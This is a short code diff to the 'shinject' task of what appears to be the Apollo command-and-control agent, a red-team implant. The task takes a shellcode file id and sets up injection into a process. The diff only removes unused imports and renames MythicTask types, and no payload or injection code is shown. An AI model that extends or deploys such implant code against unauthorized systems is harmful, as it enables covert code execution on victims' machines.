@@ -9,13 +9,8 @@
 using ApolloInterop.Classes;
 using ApolloInterop.Interfaces;
 using ApolloInterop.Structs.MythicStructs;
-using System;
-using System.Collections.Generic;
-using System.Linq;
 using System.Runtime.InteropServices;
 using System.Runtime.Serialization;
-using System.Text;
-using ST = System.Threading.Tasks;
 
 namespace Tasks
 {
@@ -29,14 +24,14 @@ namespace Tasks
             [DataMember(Name = "shellcode-file-id")]
             public string Shellcode;
         }
-        public shinject(IAgent agent, ApolloInterop.Structs.MythicStructs.Task data) : base(agent, data)
+        public shinject(IAgent agent, ApolloInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
         {
         }
 
 
         public override void Start()
         {
-            TaskResponse resp;
+            MythicTaskResponse resp;
             ShinjectArguments args = _jsonSerializer.Deserialize<ShinjectArguments>(_data.Parameters);
             System.Diagnostics.Process proc = null;
             try
